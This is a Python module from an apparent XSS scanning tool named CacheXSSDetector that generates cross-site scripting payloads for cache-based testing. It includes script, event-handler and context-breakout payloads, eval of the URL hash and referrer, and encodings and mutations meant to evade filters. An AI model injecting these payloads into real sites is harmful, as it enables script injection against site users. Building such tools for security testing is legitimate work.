"""
XSS Payload Generator for CacheXSSDetector.
Generates various XSS payloads optimized for cache-based attacks.
"""

from typing import List, Dict, Any, Optional
import random
import base64
import html
import urllib.parse
from dataclasses import dataclass
from ..utils.logger import get_logger

logger = get_logger(__name__)

@dataclass
class PayloadTemplate:
    """Template for XSS payload generation."""
    name: str
    template: str
    description: str
    category: str
    encoding: Optional[str] = None
    context: Optional[str] = None

class PayloadGenerator:
    """
    Generates XSS payloads specifically designed for cache-based attacks.
    """

    def __init__(self):
        """Initialize payload generator with predefined templates."""
        self.templates = self._initialize_templates()
        self.encoding_functions = {
            'none': lambda x: x,
            'html': html.escape,
            'url': urllib.parse.quote,
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)
        }

    def _initialize_templates(self) -> List[PayloadTemplate]:
        """
        Initialize the list of payload templates.
        
        Returns:
            List[PayloadTemplate]: List of payload templates
        """
        return [
            # Basic XSS Payloads
            PayloadTemplate(
                name="basic_alert",
                template='<script>alert("XSS")</script>',
                description="Basic XSS alert payload",
                category="basic"
            ),
            PayloadTemplate(
                name="img_onerror",
                template='<img src=x onerror=alert("XSS")>',
                description="Image onerror event payload",
                category="basic"
            ),
            
            # Cache-Specific Payloads
            PayloadTemplate(
                name="cache_time_based",
                template='<script>if(Date.now()%{time}==0)alert("XSS")</script>',
                description="Time-based cache XSS payload",
                category="cache_specific"
            ),
            PayloadTemplate(
                name="cache_variable",
                template='<script>if(window.{var})alert("XSS")</script>',
                description="Variable-based cache XSS payload",
                category="cache_specific"
            ),
            
            # DOM-based Payloads
            PayloadTemplate(
                name="dom_location",
                template='<script>eval(location.hash.slice(1))</script>',
                description="DOM-based location hash payload",
                category="dom"
            ),
            PayloadTemplate(
                name="dom_referrer",
                template='<script>eval(document.referrer)</script>',
                description="DOM-based referrer payload",
                category="dom"
            ),
            
            # Attribute-based Payloads
            PayloadTemplate(
                name="attr_script",
                template='" onload="alert(\'XSS\')" "',
                description="Attribute-based script payload",
                category="attribute"
            ),
            PayloadTemplate(
                name="attr_event",
                template='" onclick="alert(\'XSS\')" "',
                description="Event attribute payload",
                category="attribute"
            ),
            
            # Encoded Payloads
            PayloadTemplate(
                name="encoded_basic",
                template='&#60;script&#62;alert("XSS")&#60;/script&#62;',
                description="HTML encoded payload",
                category="encoded",
                encoding="html"
            ),
            PayloadTemplate(
                name="encoded_hex",
                template='\\x3Cscript\\x3Ealert("XSS")\\x3C/script\\x3E',
                description="Hex encoded payload",
                category="encoded",
                encoding="hex"
            ),
            
            # Context-Specific Payloads
            PayloadTemplate(
                name="js_context",
                template='";alert(\'XSS\');//',
                description="JavaScript context payload",
                category="context_specific",
                context="javascript"
            ),
            PayloadTemplate(
                name="html_context",
                template='<div onmouseover="alert(\'XSS\')">hover</div>',
                description="HTML context payload",
                category="context_specific",
                context="html"
            )
        ]

    def generate(
        self,
        cache_info: Optional[Dict[str, Any]] = None,
        max_length: int = 1000,
        context: Optional[str] = None,
        encoding: Optional[str] = None
    ) -> List[str]:
        """
        Generate XSS payloads based on cache behavior and context.
        
        Args:
            cache_info (Optional[Dict[str, Any]]): Cache analysis information
            max_length (int): Maximum payload length
            context (Optional[str]): Context for payload generation
            encoding (Optional[str]): Encoding type to apply
            
        Returns:
            List[str]: List of generated payloads
        """
        payloads = []
        
        try:
            # Filter templates based on context and category
            suitable_templates = self._filter_templates(context)
            
            # Generate payloads from templates
            for template in suitable_templates:
                payload = self._generate_from_template(
                    template,
                    cache_info,
                    max_length,
                    encoding or template.encoding
                )
                if payload and len(payload) <= max_length:
                    payloads.append(payload)
            
            # Add cache-specific variations
            if cache_info:
                cache_payloads = self._generate_cache_specific_payloads(cache_info)
                payloads.extend(p for p in cache_payloads if len(p) <= max_length)
            
            # Add encoded variations
            encoded_payloads = self._generate_encoded_variations(payloads)
            payloads.extend(encoded_payloads)
            
            # Deduplicate and filter by length
            payloads = list(set(p for p in payloads if len(p) <= max_length))
            
            logger.info(f"Generated {len(payloads)} payloads")
            return payloads
            
        except Exception as e:
            logger.error(f"Error generating payloads: {str(e)}")
            return []

    def _filter_templates(self, context: Optional[str]) -> List[PayloadTemplate]:
        """
        Filter payload templates based on context.
        
        Args:
            context (Optional[str]): Context for filtering templates
            
        Returns:
            List[PayloadTemplate]: Filtered list of templates
        """
        if not context:
            return self.templates
            
        return [t for t in self.templates if not t.context or t.context == context]

    def _generate_from_template(
        self,
        template: PayloadTemplate,
        cache_info: Optional[Dict[str, Any]],
        max_length: int,
        encoding: Optional[str]
    ) -> Optional[str]:
        """
        Generate a payload from a template.
        
        Args:
            template (PayloadTemplate): Template to use
            cache_info (Optional[Dict[str, Any]]): Cache analysis information
            max_length (int): Maximum payload length
            encoding (Optional[str]): Encoding to apply
            
        Returns:
            Optional[str]: Generated payload or None
        """
        try:
            payload = template.template
            
            # Replace variables in template
            if '{time}' in payload:
                payload = payload.replace('{time}', str(random.randint(1000, 9999)))
            if '{var}' in payload:
                payload = payload.replace('{var}', f'var_{random.randint(1000, 9999)}')
            
            # Apply encoding if specified
            if encoding and encoding in self.encoding_functions:
                payload = self.encoding_functions[encoding](payload)
            
            return payload if len(payload) <= max_length else None
            
        except Exception as e:
            logger.error(f"Error generating from template: {str(e)}")
            return None

    def _generate_cache_specific_payloads(self, cache_info: Dict[str, Any]) -> List[str]:
        """
        Generate payloads specific to cache behavior.
        
        Args:
            cache_info (Dict[str, Any]): Cache analysis information
            
        Returns:
            List[str]: Cache-specific payloads
        """
        payloads = []
        
        try:
            # Add time-based cache payloads
            if cache_info.get('ttl'):
                ttl = cache_info['ttl']
                payloads.append(
                    f'<script>if(Math.floor(Date.now()/{ttl}000)%2==0)alert("XSS")</script>'
                )
            
            # Add header-based payloads
            if cache_info.get('vary_headers'):
                for header in cache_info['vary_headers']:
                    payloads.append(
                        f'<script>fetch(location.href,{{headers:{{"{header}":"XSS"}}}}</script>'
                    )
            
            return payloads
            
        except Exception as e:
            logger.error(f"Error generating cache-specific payloads: {str(e)}")
            return []

    def _generate_encoded_variations(self, payloads: List[str]) -> List[str]:
        """
        Generate encoded variations of payloads.
        
        Args:
            payloads (List[str]): Original payloads
            
        Returns:
            List[str]: Encoded payload variations
        """
        variations = []
        
        try:
            for payload in payloads:
                # Apply different encodings
                for encoding, encode_func in self.encoding_functions.items():
                    if encoding != 'none':
                        try:
                            encoded = encode_func(payload)
                            variations.append(encoded)
                        except Exception as e:
                            logger.debug(f"Encoding failed for {encoding}: {str(e)}")
            
            return variations
            
        except Exception as e:
            logger.error(f"Error generating encoded variations: {str(e)}")
            return []

    def mutate_payload(self, payload: str) -> List[str]:
        """
        Generate mutations of a given payload.
        
        Args:
            payload (str): Original payload
            
        Returns:
            List[str]: List of mutated payloads
        """
        mutations = []
        
        try:
            # Case variations
            mutations.append(payload.upper())
            mutations.append(payload.lower())
            
            # Add whitespace variations
            mutations.append(payload.replace('>', ' >'))
            mutations.append(payload.replace('<', '< '))
            
            # Add line break variations
            mutations.append(payload.replace('>', '>\n'))
            mutations.append(payload.replace('<', '\n<'))
            
            # Add comment variations
            mutations.append(payload.replace('>', '/**/>', 1))
            mutations.append(payload.replace('<', '<!--\n<', 1))
            
            return list(set(mutations))
            
        except Exception as e:
            logger.error(f"Error mutating payload: {str(e)}")
            return [payload]

if __name__ == "__main__":
    # Test payload generator functionality
    generator = PayloadGenerator()
    test_payloads = generator.generate(
        cache_info={'ttl': 300, 'vary_headers': ['User-Agent']},
        context='html'
    )
    print(f"Generated {len(test_payloads)} payloads:")
    for i, payload in enumerate(test_payloads, 1):
        print(f"{i}. {payload}")
